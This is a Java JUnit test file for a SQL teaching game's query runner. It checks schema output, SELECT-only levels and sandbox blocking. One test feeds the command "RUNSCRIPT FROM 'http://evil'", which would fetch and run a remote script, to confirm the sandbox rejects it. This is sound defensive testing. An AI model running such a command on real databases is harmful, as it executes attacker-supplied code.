package com.plupp.sqlgame.core;

import com.plupp.sqlgame.model.LevelDefinition;
import org.junit.jupiter.api.Test;

import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.*;

class SqlRunnerTest {

    @Test
    void returnsSchemaMetadataForLevel() {
        LevelRepository repo = new LevelRepository();
        SqlRunner runner = new SqlRunner();
        LevelDefinition level = repo.byId("level-1").orElseThrow();
        runner.reset(level);

        List<Map<String, Object>> schema = runner.schemaForLevel(level);

        assertFalse(schema.isEmpty());
        Map<String, Object> customers = schema.stream().filter(t -> "CUSTOMERS".equals(t.get("name"))).findFirst().orElseThrow();
        List<Map<String, String>> columns = (List<Map<String, String>>) customers.get("columns");
        assertEquals(List.of("ID", "NAME", "CITY"), columns.stream().map(c -> c.get("name")).toList());
    }

    @Test
    void allowsSingleSelectStatementForLevelRun() {
        LevelRepository repo = new LevelRepository();
        SqlRunner runner = new SqlRunner();
        LevelDefinition level = repo.byId("level-1").orElseThrow();
        runner.reset(level);

        var result = runner.runForLevel(level, "SELECT name FROM customers ORDER BY name;");

        assertNull(result.error);
        assertEquals(List.of("NAME"), result.columns);
        assertFalse(result.rows.isEmpty());
    }

    @Test
    void commandAllowlistBlocksNonSelect() {
        LevelRepository repo = new LevelRepository();
        SqlRunner runner = new SqlRunner();
        LevelDefinition level = repo.byId("level-1").orElseThrow();
        runner.reset(level);

        var result = runner.runForLevel(level, "DELETE FROM customers;");

        assertEquals("This level only allows: SELECT", result.error);
    }

    @Test
    void forbiddenCommandsAreBlockedInSandbox() {
        SqlRunner runner = new SqlRunner();

        var result = runner.runSandbox("RUNSCRIPT FROM 'http://evil';");

        assertEquals("That command is blocked in sandbox mode for safety.", result.error);
    }
}
